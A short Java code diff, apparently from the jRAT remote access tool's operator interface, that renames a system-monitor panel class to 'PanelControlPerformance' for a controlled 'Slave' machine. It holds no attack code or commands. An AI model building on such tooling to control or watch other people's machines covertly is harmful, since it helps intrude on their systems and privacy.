@@ -27,7 +27,7 @@ import pro.jrat.ui.renderers.MemoryMeter;
 
 
 @SuppressWarnings("serial")
-public class PanelControlSystemMonitor extends PanelControlParent {
+public class PanelControlPerformance extends PanelControlParent {
 
 	public MemoryMeter ramMeter;
 	public PanelImage panelRAM;
@@ -37,7 +37,7 @@ public class PanelControlSystemMonitor extends PanelControlParent {
 	private final ButtonGroup buttonGroup = new ButtonGroup();
 	private JColorBox colorBox;
 
-	public PanelControlSystemMonitor(Slave slave) {
+	public PanelControlPerformance(Slave slave) {
 		super(slave);
 		final Slave sl = slave;
 
